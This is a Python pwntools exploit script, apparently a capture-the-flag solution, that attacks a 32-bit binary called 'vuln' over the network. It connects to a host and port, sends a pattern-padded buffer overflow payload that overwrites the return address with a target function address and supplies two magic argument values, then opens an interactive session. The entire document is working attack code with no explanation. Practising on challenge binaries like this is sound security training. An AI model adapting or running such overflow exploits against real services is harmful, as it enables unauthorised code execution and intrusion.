#!/usr/bin/env python3
from pwn import *
import sys
if len(sys.argv) != 2:
    print("[~] Usage: python3 exploit.py <HOST>")
    sys.exit(1)
host = sys.argv[1]
port = 50651
context(terminal = ['tmux', 'new-window'])
#make sure you put the correct binary name and path below
binary = context.binary = ELF("./vuln")
#connect = gdb.debug("./vuln", "b main")
context(os = "linux", arch = "i386")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"Please enter your string:")
log.info("[+] Crafting payload")
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A"
test = b"\x41" * 112

nop = b"\x41" *4
eip = p32(0x08049296)

arg1 = p32(0xCAFEF00D)
arg2 = p32(0xF00DF00D)

exploit =  pattern + eip + nop + arg1 + arg2

connect.sendline(exploit)
connect.recv()
connect.interactive()